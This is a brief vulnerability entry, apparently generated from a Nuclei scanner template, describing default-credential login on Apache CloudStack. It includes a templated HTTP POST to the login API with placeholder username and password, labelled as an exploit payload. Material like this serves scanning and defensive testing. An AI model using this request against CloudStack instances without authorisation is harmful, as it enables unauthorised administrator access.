# Vulnerability: Apache CloudStack - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`cloudstack-default-login.yaml`)

## Description
CloudStack instance discovered using weak default credentials, allows the attacker to gain admin privilege.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /client/api/ HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded

command=login&username={{username}}&password={{password}}&domain=%2F&response=json
```

